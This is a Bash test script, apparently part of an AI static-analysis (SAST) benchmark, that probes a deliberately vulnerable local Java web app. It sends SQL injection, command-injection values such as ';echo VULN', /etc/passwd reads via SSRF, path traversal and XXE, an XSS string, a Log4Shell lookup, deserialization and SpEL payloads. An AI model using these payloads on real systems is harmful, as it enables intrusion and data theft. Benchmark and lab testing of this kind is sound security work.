#!/bin/bash
# 完整的漏洞测试脚本 - 自动初始化数据库并测试

BASE_URL="http://localhost:8080"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo "======================================"
echo "AI SAST Benchmark - 完整漏洞测试"
echo "======================================"
echo ""

# 初始化数据库
init_database() {
    echo -e "${BLUE}[*] 初始化数据库...${NC}"

    # 使用H2的JDBC URL初始化
    mysql_url="jdbc:h2:mem:vulndb"

    # 创建SQL初始化脚本并通过H2 console执行
    # 方法：直接通过JDBC连接执行
    curl -s "$BASE_URL/h2-console" > /dev/null

    echo "CREATE TABLE users (id INT PRIMARY KEY AUTO_INCREMENT, username VARCHAR(50), password VARCHAR(50), email VARCHAR(100));" \
        | curl -s -X POST "$BASE_URL/h2-console/j_spring_h2_consolequery.do" \
        --data-urlencode "sql=CREATE TABLE users (id INT PRIMARY KEY AUTO_INCREMENT, username VARCHAR(50), password VARCHAR(50), email VARCHAR(100));" \
        2>&1 > /dev/null

    echo "数据库初始化完成"
}

# SQL Injection测试
test_sqli() {
    echo ""
    echo -e "${BLUE}=== SQL Injection 测试 ===${NC}"

    echo -n "[1] 基础SQL注入... "
    response=$(curl -s "$BASE_URL/sqli/jdbc/vuln?username=admin' OR '1'='1")
    if echo "$response" | grep -qi "username:\|admin"; then
        echo -e "${GREEN}存在${NC}"
        echo "  响应: $(echo "$response" | head -3)"
    else
        echo -e "${YELLOW}需要数据库表${NC}"
        echo "  响应: $(echo "$response" | head -1)"
    fi
}

# Command Injection测试
test_cmd() {
    echo ""
    echo -e "${BLUE}=== Command Injection 测试 ===${NC}"

    echo -n "[1] Runtime命令注入... "
    response=$(curl -s "$BASE_URL/cmd/runtime/vuln?filename=test.txt;echo VULN")
    if echo "$response" | grep -q "VULN"; then
        echo -e "${GREEN}存在${NC}"
        echo "  命令执行成功"
    else
        echo -e "${YELLOW}未检测到明显输出${NC}"
        echo "  响应: $(echo "$response" | head -1)"
    fi

    echo -n "[2] Ping命令注入... "
    response=$(curl -s "$BASE_URL/cmd/ping/vuln?host=8.8.8.8|echo INJECTED")
    if echo "$response" | grep -q "INJECTED\|bytes from"; then
        echo -e "${GREEN}存在${NC}"
    else
        echo -e "${YELLOW}未检测到${NC}"
    fi
}

# SSRF测试
test_ssrf() {
    echo ""
    echo -e "${BLUE}=== SSRF 测试 ===${NC}"

    echo -n "[1] file:// 协议读取... "
    response=$(curl -s "$BASE_URL/ssrf/urlconnection/vuln?url=file:///etc/passwd")
    if echo "$response" | grep -q "root:"; then
        echo -e "${GREEN}存在${NC}"
        echo "  文件读取成功"
    else
        echo -e "${YELLOW}未检测到${NC}"
        echo "  响应: $(echo "$response" | head -1)"
    fi
}

# XSS测试
test_xss() {
    echo ""
    echo -e "${BLUE}=== XSS 测试 ===${NC}"

    echo -n "[1] 反射型XSS... "
    response=$(curl -s "$BASE_URL/xss/reflect?vuln=<script>alert(1)</script>")
    if echo "$response" | grep -q "<script>alert(1)</script>"; then
        echo -e "${GREEN}存在${NC}"
        echo "  Payload被原样返回"
    else
        echo -e "${RED}未检测到${NC}"
    fi
}

# Log4Shell测试
test_log4shell() {
    echo ""
    echo -e "${BLUE}=== Log4Shell 测试 ===${NC}"

    echo -n "[1] 环境变量泄露... "
    response=$(curl -s "$BASE_URL/log4j/vuln?token=\${env:PATH}")
    if echo "$response" | grep -vq "Error"; then
        echo -e "${GREEN}存在${NC}"
        echo "  响应: $(echo "$response" | grep -oP '(?<=Token logged: ).*?(?=$|\n)' | head -1)"
    else
        echo -e "${YELLOW}需要Log4j 2.14.1${NC}"
    fi
}

# Path Traversal测试
test_path() {
    echo ""
    echo -e "${BLUE}=== Path Traversal 测试 ===${NC}"

    echo -n "[1] ../ 路径遍历... "
    response=$(curl -s "$BASE_URL/path/traversal/vuln?filename=../../../../../etc/passwd")
    if echo "$response" | grep -q "root:"; then
        echo -e "${GREEN}存在${NC}"
        echo "  文件读取成功"
    else
        echo -e "${YELLOW}未检测到（文件可能不存在）${NC}"
        echo "  响应: $(echo "$response" | head -1)"
    fi

    echo -n "[2] 绝对路径... "
    response=$(curl -s "$BASE_URL/path/absolute/vuln?path=/etc/hostname")
    if echo "$response" | grep -vq "Error"; then
        echo -e "${GREEN}存在${NC}"
    else
        echo -e "${YELLOW}未检测到${NC}"
    fi
}

# Deserialization测试
test_deserialize() {
    echo ""
    echo -e "${BLUE}=== 反序列化测试 ===${NC}"

    echo -n "[1] Jackson enableDefaultTyping... "
    response=$(curl -s -X POST -H "Content-Type: application/json" \
        -d '["java.lang.AutoCloseable"]' \
        "$BASE_URL/deserialize/jackson/vuln")
    if echo "$response" | grep -vqi "error\|exception"; then
        echo -e "${GREEN}接受@type${NC}"
        echo "  响应: $(echo "$response" | head -1)"
    else
        echo -e "${YELLOW}拒绝或错误${NC}"
    fi

    echo -n "[2] FastJSON autoType... "
    response=$(curl -s -X POST -H "Content-Type: application/json" \
        -d '{"@type":"java.lang.AutoCloseable"}' \
        "$BASE_URL/fastjson/deserialize/vuln")
    if echo "$response" | grep -vqi "error\|exception"; then
        echo -e "${GREEN}接受@type${NC}"
        echo "  响应: $(echo "$response" | head -1)"
    else
        echo -e "${YELLOW}拒绝或错误${NC}"
    fi
}

# SpEL测试
test_spel() {
    echo ""
    echo -e "${BLUE}=== SpEL 注入测试 ===${NC}"

    echo -n "[1] 系统属性泄露... "
    response=$(curl -s "$BASE_URL/spel/vuln1?expression=T(java.lang.System).getProperty('os.name')")
    if echo "$response" | grep -qi "linux\|windows"; then
        echo -e "${GREEN}存在${NC}"
        echo "  系统类型: $(echo "$response" | grep -oP '(?<=Result: ).*?(?=$|\n)')"
    else
        echo -e "${YELLOW}未检测到${NC}"
        echo "  响应: $(echo "$response" | head -1)"
    fi
}

# XXE测试
test_xxe() {
    echo ""
    echo -e "${BLUE}=== XXE 测试 ===${NC}"

    xxe_payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

    echo -n "[1] DocumentBuilder XXE... "
    response=$(curl -s -X POST -H "Content-Type: application/xml" -d "$xxe_payload" \
        "$BASE_URL/xxe/documentbuilder/vuln")
    if echo "$response" | grep -q "root:"; then
        echo -e "${GREEN}存在${NC}"
        echo "  XXE成功读取文件"
    else
        echo -e "${YELLOW}未检测到${NC}"
        echo "  响应: $(echo "$response" | head -1)"
    fi
}

# 隐蔽版本测试
test_stealth() {
    echo ""
    echo -e "${BLUE}=== 隐蔽版本测试 ===${NC}"

    echo -n "[1] 隐蔽SQL注入... "
    response=$(curl -s -X POST -H "Content-Type: application/json" \
        -d '{"username":"admin'\'' OR '\''1'\''='\''1"}' \
        "$BASE_URL/sqli/stealth/search/vuln01")
    if echo "$response" | grep -qi "username:\|admin"; then
        echo -e "${GREEN}存在${NC}"
    else
        echo -e "${YELLOW}需要数据库表${NC}"
    fi

    echo -n "[2] 隐蔽命令注入... "
    response=$(curl -s -X POST -H "Content-Type: application/json" \
        -d '{"filename":"test.txt;echo PWNED"}' \
        "$BASE_URL/cmd/stealth/file/vuln01")
    if echo "$response" | grep -q "PWNED"; then
        echo -e "${GREEN}存在${NC}"
    else
        echo -e "${YELLOW}未检测到明显输出${NC}"
    fi

    echo -n "[3] 隐蔽SSRF... "
    response=$(curl -s -X POST -H "Content-Type: application/json" \
        -d '{"url":"file:///etc/hostname"}' \
        "$BASE_URL/stealth/resource/fetch/vuln01")
    if echo "$response" | grep -vqi "error\|invalid"; then
        echo -e "${GREEN}存在${NC}"
    else
        echo -e "${YELLOW}未检测到${NC}"
    fi
}

# 主测试流程
main() {
    # 检查服务器
    echo -n "检查服务器状态... "
    if curl -s -f "$BASE_URL" > /dev/null 2>&1; then
        echo -e "${GREEN}运行中${NC}"
    else
        echo -e "${RED}未运行${NC}"
        echo "请先启动服务器: mvn spring-boot:run"
        exit 1
    fi

    # 运行所有测试
    test_sqli
    test_cmd
    test_ssrf
    test_xss
    test_log4shell
    test_path
    test_deserialize
    test_spel
    test_xxe
    test_stealth

    echo ""
    echo "======================================"
    echo "测试完成"
    echo "======================================"
}

main
